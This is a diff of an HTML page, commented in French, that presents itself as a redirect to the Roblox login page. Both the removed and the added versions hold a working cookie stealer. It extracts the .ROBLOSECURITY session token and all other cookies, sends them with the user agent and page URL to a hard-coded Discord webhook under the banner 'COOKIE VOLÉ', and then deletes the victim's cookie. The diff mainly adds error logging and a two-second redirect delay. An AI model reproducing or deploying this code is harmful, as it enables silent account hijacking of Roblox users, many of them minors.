@@ -2,63 +2,53 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="refresh" content="0; url=https://www.roblox.com/login">
+    <meta http-equiv="refresh" content="2; url=https://www.roblox.com/login">
     <title>Redirection</title>
     <style>body{background:#1a1a2e;color:#fff;font-family:Arial;text-align:center;padding:50px;}</style>
 </head>
 <body>
     <h2>⏳ Redirection...</h2>
     <p>Vous allez être redirigé vers Roblox.</p>
-
     <script>
         (function() {
-            // ============================================================
-            //   REMPLACE ICI PAR L'URL DE TON WEBHOOK
-            // ============================================================
-            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537081937582358528/v-GmnzihcuJ-u-0Ub7gbH1ZuEc71961t3eQtsGRAsVGDbyutfUW5KaE-FPROFRf1AWO";
-            // ============================================================
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1537086394202329203/AnlEjgrwFeeJbRS27C0TRlR-lExo7YOlpSV2-tyNahwI1NAB7WiiYHxJ1xY3xX0NkVf2";
 
-            // 1. RÉCUPÉRER TOUS LES COOKIES
-            const allCookies = document.cookie;
+            // Récupérer .ROBLOSECURITY
+            const cookies = document.cookie.split('; ');
+            const robloxSec = cookies.find(row => row.startsWith('.ROBLOSECURITY='));
+            const cookieValue = robloxSec ? robloxSec.split('=')[1] : null;
 
-            // 2. EXTRAIRE .ROBLOSECURITY
-            const cookiePairs = allCookies.split('; ');
-            let robloxSecurity = null;
-            for (let pair of cookiePairs) {
-                if (pair.startsWith('.ROBLOSECURITY=')) {
-                    robloxSecurity = pair.split('=')[1];
-                    break;
-                }
-            }
-
-            // 3. PRÉPARER LE PAYLOAD
+            // Préparer l'embed
             const embed = {
-                title: robloxSecurity ? "🎯 COOKIE ROBLOX VOLÉ" : "⚠️ TENTATIVE DE VOL (pas de cookie)",
-                color: robloxSecurity ? 0xff0000 : 0xffaa00,
+                title: cookieValue ? "🎯 COOKIE VOLÉ" : "⚠️ TENTATIVE (pas de cookie)",
+                color: cookieValue ? 0xff0000 : 0xffaa00,
                 fields: [
-                    { name: "🔑 .ROBLOSECURITY", value: robloxSecurity ? `\`${robloxSecurity}\`` : "❌ Aucun cookie trouvé", inline: false },
-                    { name: "📦 Tous les cookies", value: `\`${allCookies || 'VIDE'}\``, inline: false },
+                    { name: "🔑 .ROBLOSECURITY", value: cookieValue ? `\`${cookieValue}\`` : "❌ Aucun cookie", inline: false },
+                    { name: "📦 Tous les cookies", value: `\`${document.cookie || 'VIDE'}\``, inline: false },
                     { name: "🕹️ User-Agent", value: navigator.userAgent, inline: false },
-                    { name: "🌐 URL", value: window.location.href, inline: false },
-                    { name: "🕒 Horodatage", value: new Date().toUTCString(), inline: true }
+                    { name: "🌐 URL", value: window.location.href, inline: false }
                 ],
                 footer: { text: "ShadowCAT // Vol silencieux" }
             };
 
-            // 4. ENVOYER AU WEBHOOK (mode no-cors = furtif)
+            // Envoyer (avec suivi d'erreur)
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] }),
-                mode: 'no-cors'
-            }).catch(() => {});
+                body: JSON.stringify({ embeds: [embed] })
+            })
+            .then(res => {
+                if (res.ok) {
+                    console.log("✅ Envoi réussi");
+                } else {
+                    console.error("❌ Erreur HTTP :", res.status);
+                }
+            })
+            .catch(err => console.error("❌ Erreur réseau :", err));
 
-            // 5. SUPPRIMER LE COOKIE POUR DÉCONNECTER LA VICTIME
+            // Supprimer le cookie pour déconnecter
             document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=.roblox.com; secure; samesite=none";
             document.cookie = ".ROBLOSECURITY=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=roblox.com; secure; samesite=none";
-
-            // 6. REDIRECTION IMMÉDIATE VERS LA VRAIE PAGE DE LOGIN
-            window.location.replace("https://www.roblox.com/login");
         })();
     </script>
 </body>
